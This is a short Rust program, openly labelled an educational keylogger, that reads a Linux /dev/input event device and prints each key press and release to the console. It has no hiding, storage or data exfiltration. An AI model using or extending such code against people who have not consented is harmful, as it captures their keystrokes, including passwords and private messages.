/*
 * SystematicKeylogger
 *
 * DISCLAIMER:
 * This keylogger is provided for educational purposes only.
 * Do not run it on systems where you do not have explicit permission.
 *
 * Requirements:
 *  - Linux OS with access to input devices (e.g., /dev/input/eventX).
 *  - Root privileges or proper udev rules for reading input events.
 */

use evdev::{Device, InputEventKind};
use std::env;
use std::io::Error;
use std::time::Duration;
use std::thread;

fn main() -> Result<(), Error> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Usage: {} <input_device>", args[0]);
        println!("Example: {} /dev/input/event3", args[0]);
        return Ok(());
    }

    let device_path = &args[1];
    let mut device = Device::open(device_path)?;
    
    println!("Keylogger started on device: {}", device_path);
    println!("Logging key events (press Ctrl+C to exit)...");

    loop {
        // Fetch available events
        for ev in device.fetch_events()? {
            if let InputEventKind::Key(key) = ev.kind() {
                // The ev.value() returns:
                // 0 for key release, 1 for key press, 2 for auto-repeat.
                println!("Key: {:?}, Value: {}", key, ev.value());
            }
        }
        thread::sleep(Duration::from_millis(50));
    }
}
